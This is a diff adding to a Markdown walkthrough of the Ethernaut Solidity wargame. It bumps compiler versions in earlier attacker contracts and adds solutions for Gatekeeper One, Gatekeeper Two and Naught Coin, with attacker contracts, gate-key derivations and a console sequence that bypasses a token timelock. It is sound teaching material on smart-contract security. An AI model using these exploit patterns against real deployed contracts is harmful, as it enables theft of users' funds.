@@ -144,7 +144,7 @@ Things to consider:
 This function tries to leverage `block.value` in order to create a kind of randomness. In reality, this is not completely random, because Solidity contracts are deterministic. We can anticipate the CoinFlip contract's results and use this information to exploit it. In this case, we can easily detect which will be the value to pass to the function by creating a contract that performs the same exact calculations that the `flip()` function carries out, and then call `flip()` in the same transaction with the boolean value obtained from doing said calculations. We can build a simple contract in remix to do this:
 ```solidity
 // SPDX-License-Identifier: MIT
-pragma solidity 0.8.4;
+pragma solidity 0.8.17;
 interface ICoinFlip {
     function flip(bool _guess) external returns (bool);
 }
@@ -191,7 +191,7 @@ As we can see, in order to become the owner, `tx.origin` must be different from 
 Knowing this, we reach the conclusion that in order to change the contract ownership, we need to call the 'changeOwner()' from a contract. We can create a simple contract to do so:
 ```solidity
 // SPDX-License-Identifier: MIT
-pragma solidity 0.8.4;
+pragma solidity 0.8.17;
 interface ITelephone {
     function changeOwner(address _owner) external;
 }
@@ -304,7 +304,7 @@ contract Force {/*
 The only way to force sending funds to a contract that can't receive ether is via `selfdestruct()`. Selfdestruct method will destroy the contract executing it, and will send all the contract's funds to the address specified as parameter. Knowing this, we can create a contract, send it some ether and selfdestruct it, passing the Force contract address as the funds receiver. This way, we'll increase the balance of Fund contract without it requiring `receive()` nor `fallback()`. An example contract to do so would be:
 ``` solidity
 // SPDX-License-Identifier: MIT
-pragma solidity 0.8.4;
+pragma solidity 0.8.17;
 
 contract Attacker {
 
@@ -371,7 +371,7 @@ The `receive()` function will first check that the `msg.value` is higher than th
 As we have learnt in the past levels, transfers of ether are handled by contracts via `receive()` and `fallback()` functions. Because we want the level to never be able to reclaim kingship when we submit the instance, we could reclaim kingship first with a contract that reverts always when receiving funds. We can easily do this by setting up a contract that always reverts when triggering its fallback function. An example of such a contract could be:
 ```solidity
 // SPDX-License-Identifier: MIT
-pragma solidity 0.8.4;
+pragma solidity 0.8.17;
 
 contract Attacker {
 
@@ -425,7 +425,7 @@ Our attacker contract could be something like this:
 
 ```solidity
 // SPDX-License-Identifier: MIT
-pragma solidity 0.8.4;
+pragma solidity 0.8.17;
 
 interface IReentrance {
     function withdraw(uint256 _amount) external;
@@ -483,7 +483,7 @@ The only possible way to tackle this issue is by making the `isLastFloor(_floor)
 
 ```solidity
 // SPDX-License-Identifier: MIT
-pragma solidity 0.8.4;
+pragma solidity 0.8.17;
 interface IElevator {
     function goTo(uint _floor) external;
 }
@@ -514,18 +514,18 @@ After calling the `goTo()` function in our malicious contract, the `goTo()` funt
 
 
 ## 13. Privacy 🥷🏻
->The creator of this contract was careful enough to protect the sensitive areas of its storage.
+> The creator of this contract was careful enough to protect the sensitive areas of its storage.
 >
->Unlock this contract to beat the level.
+> Unlock this contract to beat the level.
 >
->Things that might help:
+> Things that might help:
 >
 > - Understanding how storage works
 > - Understanding how parameter parsing works
 > - Understanding how casting works
 > Tips:
 >
-> - Remember that metamask is just a commodity. Use another tool if it is presenting problems. Advanced gameplay could involve using remix, or your own >web3 provider.
+> - Remember that metamask is just a commodity. Use another tool if it is presenting problems. Advanced gameplay could involve using remix, or your own > web3 provider.
 
 In order to surpass this level, we need to unlock the contract, setting the `locked` variable to false. This can be done calling the `unlock()` function, where we pass a 16-byte key as parameter, and it needs to be equal to `bytes16(data[2])`. Just as the first level indications state, it is really important for this level to understand how storage works in solidity. (I recommend checking [Solidity's official documentation](https://docs.soliditylang.org/en/v0.8.17/internals/layout_in_storage.html) to understand storage better). Knowing this, let's get to work!  
 
@@ -575,3 +575,286 @@ We found the key! Now we only need to call the `unlock()` function passing the 0
 Congrats, you just stepped up your Solidity game!😎
 
 13th Ethernaut level completed ✅
+
+## 14. Gatekeeper One 🚧
+
+> Make it past the gatekeeper and register as an entrant to pass this level.
+>
+> Things that might help:
+> - Remember what you've learned from the Telephone and Token levels.
+> - You can learn more about the special function gasleft(), in Solidity's documentation (see here and here).
+
+The goal for this level is to register as an entrant using the `enter()` function. This function just sets `tx.origin` as the entrant (pretty innocent tbh), but it has three modifiers controlling its access. We must surpass these modifiers in order to successfully enter the function and register ourselves as an entrant.
+```solidity
+function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
+    entrant = tx.origin;
+    return true;
+  }
+```
+
+We'll go through the gates one by one:
+- `gateOne()`:
+```solidity
+modifier gateOne() {
+    require(msg.sender != tx.origin);
+    _;
+  }
+```
+`gateOne()` is just checking whether `msg.sender` is different from `tx.origin`. We already learnt the differences between them in the Telephone level, so we reach the conclusion that in order to surpass this first modifier we'll just need to call the `enter()` function from a contract crafted by ourselves, rather than directly from our EOA.
+
+- `gateTwo()`:
+```solidity
+modifier gateTwo() {
+    require(gasleft() % 8191 == 0);
+    _;
+  }
+```
+This second modifier checks whether module between `gasLeft()` and 8191 is equal to 0. `gasLeft()` just returns the remaining available gas for the function to run successfully. In solidity, gas used is computed based on the OPCODES used for that code (check [evm.codes](https://www.evm.codes/)). It can even change a bit depending on the compiler version we are using for the code we want to execute, so it would be pretty hard to try to guess the exact value that allows us to surpass the `gasleft() % 8191 == 0` check. The most viable solution in this case is to follow [CMichel's Ethernaut Solution](https://cmichel.io/ethernaut-solutions/) and brute-force it. The attack function in our malicious contract would look something like this:
+```solidity
+  function attack(bytes8 _gateKey, uint256 gasToUse) external {
+      for (uint256 i = 0; i <= 8191; i++) {
+          try gatekeeperOne.enter{gas: gasToUse}(_gateKey) {
+              break;
+          } catch {}
+      }
+  }   
+```
+
+- `gateThree()`:
+```solidity
+ modifier gateThree(bytes8 _gateKey) {
+      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
+      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
+      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
+    _;
+  }
+```
+`gateThree()` is a combination of type casts (the previous level was a good training for this one). Looking at the three requires, we first see that the only one allowing us to predict a value for `_gateKey` is the third one, because it is playing around with `tx.origin`. 
+  - `require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)))` 
+
+  The right side of the comparison is first casting `tx.origin` to 160 bits. Because addresses in Solidity are 20 Bytes large (or 160 bits) and `tx.origin` is an address, the first type cast to 160 bits won't affect us. We then have a type cast to a smaller uint number (160 bits to 16 bits cast). In Solidity, converting an unsigned integer to a smaller type will result in the left-most bits (or the Most Significant Bits) being discarded. So the result for the right side cast will be:
+  ```solidity
+  // tx. origin
+  0x28D9F73D4Ce4ce594b2B231714b03139ad74F3C1 // @note: change it for the address you'll use as `tx.origin`
+
+  // uint160(tx.origin)
+  0x28D9F73D4Ce4ce594b2B231714b03139ad74F3C1 // as we saw, it'll remain the same
+
+  // uint16(uint160(tx.origin))
+  0xF3C1 // 144 left-most bits get discarded (160 bits - 16 bits = 144 bits)
+  ```
+
+  The left side of the comparison is first casting the `_gateKey` (which is 8 bytes long, or 64 bits) to 64 bits, so the first conversion won't affect us. Then, it casts the result again to 32 bits. If we want the left side to be equal to the right side, uint32(uint64(_gateKey)) should be equal to 0xF3C1 (as we discovered above). I recommend going through the process of casting and the output step by step, and see how adding zeroes in the middle of our `_gateKey`  value can make it be the same as the value we found earlier:
+  ```solidity
+  // initial value we could have derived from `tx.origin`
+  0x14b03139ad74F3C1
+  // _gateKey
+  0x14b031390000F3C1 // 8 bytes, or 64 bits. Replace middle four bytes with zeroes
+
+  // uint64(_gateKey)
+  0x14b031390000F3C1 // as we saw, it'll remain the same 64 bits
+
+  // uint32(uint64(_gateKey))
+  0x0000F3C1 // 32 left-most bits get discarded (64 bits - 32 bits = 32 bits). 0x0000F3C1 is the same as 0xF3C1 (left zeroes don't affect the actual value), so third require surpassed🙌🏻 
+  ```
+  In my case, I reached the conclusion of where to put the middle zeroes by going through the process step by step, checking what happened to the bytes.
+
+  Let's now check the first require:
+  - `require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)))`
+
+  The left side of this comparison is the same as the require we checked before, so we know _gateKey will be 0x14b03139ad74F3C1, and the resulting value after casting will be 0x0000F3C1. If we perform the right side of the comparison:
+  ```solidity
+  // _gateKey (obtained from previous reasoning about the third require)
+  0x14b031390000F3C1 // 8 bytes, or 64 bits. 
+  
+  // uint64(_gateKey)
+  0x14b031390000F3C1 // as we saw, it'll remain the same 64 bits
+
+  // uint16(uint64(_gateKey))
+  0xF3C1 // 48 left-most bits get discarded (64 bits - 16 bits = 48 bits). 
+  ```
+
+  0x0000F3C1 is the same as 0xF3C1 (left zeroes don't affect the actual value), so first require surpassed🙌🏻
+
+  At this point we can imagine that the `_gateKey` value we have found is correct, but let's check the second require to confirm:
+  - `require(uint32(uint64(_gateKey)) != uint64(_gateKey))`
+  The left side of this comparison is the same as the require we checked before, so we know _gateKey will be 0x14b03139ad74F3C1. The right side of this comparison will be: 
+
+```solidity
+  // _gateKey (obtained from previous reasoning about the third require)
+  0x14b031390000F3C1 // 8 bytes, or 64 bits. 
+  
+  // uint64(_gateKey)
+  0x14b031390000F3C1 // as we saw, it'll remain the same 64 bits
+```
+
+  0x14b031390000F3C1 is different from 0x14b03139ad74F3C1, so the second require will be succesfully surpassed!
+
+  Gate Key discovered! Our final malicious contract is ready, and we just need to call the `attack` function, passing the gatekey we just discovered (0x14b031390000F3C1 in my case) as parameter in order to become the entrant:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.17;
+interface IGatekeeperOne {
+    function enter(bytes8 _gateKey) external returns (bool);
+}
+
+contract Attacker {
+    IGatekeeperOne gatekeeperOne;
+
+    constructor(address _gatekeeperOne) {
+        gatekeeperOne = IGatekeeperOne(_gatekeeperOne);
+    }
+
+    function attack(bytes8 _gateKey, uint256 gasToUse) external {
+        for (uint256 i = 0; i <= 8191; i++) {
+            try gatekeeperOne.enter{gas: gasToUse}(_gateKey) {
+                break;
+            } catch {}
+        }
+    }   
+}
+```
+14th Ethernaut level completed ✅
+## 15. Gatekeeper Two 🚧 🚧
+
+>This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.
+>
+>Things that might help:
+> - Remember what you've learned from getting past the first gatekeeper - the first gate is the same.
+> - The assembly keyword in the second gate allows a contract to access functionality that is not native to vanilla Solidity. See here for more information. The extcodesize call in this gate will get the size of a contract's code at a given address - you can learn more about how and when this is set in section 7 of the yellow paper.
+> - The ^ character in the third gate is a bitwise operation (XOR), and is used here to apply another common bitwise operation (see here). The Coin Flip level is also a good place to start > when approaching this challenge.
+
+This level is similar to Gatekeeper One. We must become the contract `entrant` by surpassing the three gate modifiers in the `enter()` function.
+
+Again, we'll go through the gates one by one:
+- `gateOne()`:
+```solidity
+modifier gateOne() {
+    require(msg.sender != tx.origin);
+    _;
+  }
+```
+`gateOne()` is the exact same mechanism as in Gatekeeper One: it is just checking whether `msg.sender` is different from `tx.origin`. To surpass this gate, we'll just need to call the `enter()` function from a contract crafted by ourselves, rather than directly from our EOA.
+
+- `gateTwo()`:
+```solidity
+modifier gateTwo() {
+    uint x;
+    assembly { x := extcodesize(caller()) }
+    require(x == 0);
+    _;
+  }
+```
+The second gate adds a little bit of yul, a programming language used as an intermediate language in the compilation of smart contracts written in  Solidity. If you want to learn more about Yul, I recommend [this Udemy course](https://www.udemy.com/course/advanced-solidity-yul-and-assembly/) from [Jeffrey Scholz](https://twitter.com/Jeyffre).
+In this case, the assembly block of code is pretty straightforward and also commented in the level tips: `extcodesize` will just return the code size of the caller. The code size must be 0 in order to surpass the gate. Usually,  `extcodesize` will return 0 if the caller is an EOA. If the caller is a contract, the code size will be greater than 0, so `extcodesize` will return a number higher than 0. This is a problem for us: the first gate forces the caller to be a Smart Contract and not an EOA, but in the second gate we want `extcodesize` to return 0 (we said that usually `extcodesize` will return a number > 0 ifthe caller is a smart contract). How can we approach this?
+There's a specific case where `extcodesize` will return a number equal to 0 even if the caller is a contract. As we can see in [this great article by Consensys](https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/extcodesize-checks/), **a contract does not have source code available during construction**. This means that while the constructor is running, it can make calls to other contracts and `extcodesize` will return 0. This is exactly what we need! Now we know that in order to be able to surpass the second gate we should call `enter()` from our malicious contract's constructor.
+
+- `gateThree()`:
+```solidity
+ modifier gateThree(bytes8 _gateKey) {
+    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
+    _;
+  }
+```
+  The third gate is similar to Gatekeeper One's third gate. There most important clue in this third gate is the XOR bitwise (`^`) operator. How does an XOR work? When comparing two inputs `a` and `b`, an XOR output will be 1 if the two bits we compare from the inputs are different, or 0 otherwise. Imagine `a` = 10110101 and `b` = 01010110. The XOR output for each bit will be:
+  ```solidity
+                                  a->   10110101
+                                  b->   01010110
+                                        --------
+                                  c->   11100011
+  ```
+  XOR's have four properties:
+  - Commutative: a ^ b = b ^ a
+  - Associative: a ^(b ^ c) = (a ^ b) ^ c
+  - Identity element: a ^ 0 = a
+  - Self inverse: a ^ a = 0
+  Let's say our `a` value is `uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))`, while our `c` value is `type(uint64).max`, while `uint64(_gateKey)`, which is `b`, remains unknown and we want to find it out. We can demonstrate that if `a` ^ `b` = `c`, then `a` ^ `c` = `b` applying boolean algebra and some of the XOR properties we just learnt above:
+  ```solidity
+  a ^ b = c
+  a ^ (a ^ b) = a ^ c
+  (a ^ a) ^ b = a ^ c
+  0 ^ b = a ^ c
+  b = a ^ c
+  ```
+  So we know that `uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))` ^ `type(uint64).max` = `uint64(_gateKey)`. We can just add this in our malicious contract in order to find out the gate key, considering that `msg.sender` will be our contract's address (because it will be the account executing the transaction). Our malicious contract finally looks something like this:
+  ```solidity
+  // SPDX-License-Identifier: MIT
+  pragma solidity 0.8.17;
+  interface IGatekeeperTwo {
+      function enter(bytes8 _gateKey) external returns (bool);
+  }
+
+  contract Attacker {
+      IGatekeeperTwo gatekeeperTwo;
+
+      constructor(address _gatekeeperTwo) {
+          bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
+        IGatekeeperTwo(_gatekeeperTwo).enter(gateKey);
+      }
+  
+  }
+  ```
+15th Ethernaut level completed ✅
+## 16. Naught Coin 🪙🪙🪙
+> NaughtCoin is an ERC20 token and you're already holding all of them. The catch is that you'll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.
+>
+> Things that might help
+> - The ERC20 Spec
+> - The OpenZeppelin codebase
+
+This level shows the NaughCoin token, a token which mints all of its supply to the player (ourselves) on the token constructor, and which also has a timelock period of 10 years. This means that the player won't be able to transfer their tokens until 10 years have passed. Our goal for this level is to get rid of these tokens before the timelock period reaches an end. 
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.17;
+
+import 'openzeppelin-contracts-08/token/ERC20/ERC20.sol';
+
+ contract NaughtCoin is ERC20 {
+
+  // string public constant name = 'NaughtCoin';
+  // string public constant symbol = '0x0';
+  // uint public constant decimals = 18;
+  uint public timeLock = block.timestamp + 10 * 365 days;
+  uint256 public INITIAL_SUPPLY;
+  address public player;
+
+  constructor(address _player) 
+  ERC20('NaughtCoin', '0x0') {
+    player = _player;
+    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
+    // _totalSupply = INITIAL_SUPPLY;
+    // _balances[player] = INITIAL_SUPPLY;
+    _mint(player, INITIAL_SUPPLY);
+    emit Transfer(address(0), player, INITIAL_SUPPLY);
+  }
+  
+  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
+    super.transfer(_to, _value);
+  }
+
+  // Prevent the initial owner from transferring tokens until the timelock has passed
+  modifier lockTokens() {
+    if (msg.sender == player) {
+      require(block.timestamp > timeLock);
+      _;
+    } else {
+     _;
+    }
+  } 
+} 
+```
+
+Notice that this token inherits from OpenZeppelin's ERC20 implementation. This allows the NaughtCoin token to be able to call any ERC20 function, even if it's not shown directly in this contract. As we can see in the contract code, the `transfer()` function overrides the ERC20 `transfer()` method, adding the `lockTokens()` modifier which makes sure to only allow the player to transfer their funds if the timelock period has passed. So we, as the player, we won't be able to directly use this function to get rid of the tokens. But because we inherit from ERC20, we have access to a lot more functions.
+
+It is important to be aware of the fact that tokens permit to create allowances, where the owner of an amount of tokens allows another user to transfer the owner's funds on their behalf using the `transferFrom` function from the ERC20 standard. This function requires an approved allowance in order to be triggered. We can use the `approve()` function, also from the ERC20 standard, in order to approve a certain amount of tokens (in our case the initial supply from the token contract, which is `1000000 * (10**uint256(decimals())`) to be transferred by ourselves. This way, we will be able to trigger the `transferFrom` function  (if we didn't approve ourselves as operators we would have got an `insufficient allowance` error), and directly transfer the funds to another account different than ours. We can easily do it in Ethernaut's console likeso:
+
+```javascript
+// First approve ourselves as operators (note that this is being executed from the same 0x28D9F73D4Ce4ce594b2B231714b03139ad74F3C1 account)
+await contract.approve("0x28D9F73D4Ce4ce594b2B231714b03139ad74F3C1", "1000000000000000000000000");
+// Once we have allowance, transfer all balance to another random account
+await contract.transferFrom("0x28D9F73D4Ce4ce594b2B231714b03139ad74F3C1", "0x1a470e9916f3dFF8E268A69A39fa2E9F7B954927", "1000000000000000000000000");
+```
+16th Ethernaut level completed ✅
+
